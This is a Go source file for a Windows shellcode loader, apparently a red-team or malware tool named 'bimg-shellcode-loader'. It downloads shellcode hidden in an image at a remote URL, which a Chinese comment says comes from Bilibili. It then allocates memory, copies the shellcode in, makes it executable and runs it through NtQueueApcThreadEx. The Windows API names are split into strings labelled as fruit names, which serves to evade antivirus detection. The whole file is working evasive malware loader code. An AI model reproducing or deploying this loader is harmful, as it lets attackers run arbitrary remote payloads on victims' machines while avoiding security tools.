package loader

import (
	"bimg-shellcode-loader/image"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

// https://docs.microsoft.com/en-us/windows/win32/midl/enum
const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLGAS_MAX_VALUE
)

const (
	apple      = "k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + ".d" + "l" + "l"
	banana     = "n" + "t" + "d" + "l" + "l" + ".d" + "l" + "l"
	cherry     = "V" + "i" + "r" + "t" + "u" + "a" + "l" + "A" + "l" + "l" + "o" + "c"
	date       = "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t"
	elderberry = "G" + "e" + "t" + "C" + "u" + "r" + "r" + "e" + "n" + "t" + "T" + "h" + "r" + "e" + "a" + "d"
	fig        = "R" + "t" + "l" + "C" + "o" + "p" + "y" + "M" + "e" + "m" + "o" + "r" + "y"
	grapefruit = "N" + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x"
)

func Loader(url string) {
	// 随便写一些代码，让编译器不要优化掉

	// 从b站上下载图片，获取shellcode
	shellcode := image.GetShellcode(url)

	// Pop Calc Shellcode

	abc := windows.NewLazySystemDLL(apple)
	bcd := windows.NewLazySystemDLL(banana)

	cde := abc.NewProc(cherry)
	def := abc.NewProc(date)
	fed := abc.NewProc(elderberry)
	ert := bcd.NewProc(fig)
	qwe := bcd.NewProc(grapefruit)

	addr, _, errcde := cde.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errcde != nil && errcde.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling cde:\r\n%s", errcde.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]cde failed and returned 0")
	}

	_, _, errert := ert.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errert != nil && errert.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ert:\r\n%s", errert.Error()))
	}

	oldProtect := PAGE_READWRITE
	_, _, errdef := def.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errdef != nil && errdef.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling def:\r\n%s", errdef.Error()))
	}

	thread, _, err := fed.Call()
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling fed:\n%s", err))
	}

	//USER_APC_OPTION := uintptr(QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC)
	_, _, err = qwe.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling qwe:\n%s", err))
	}

}
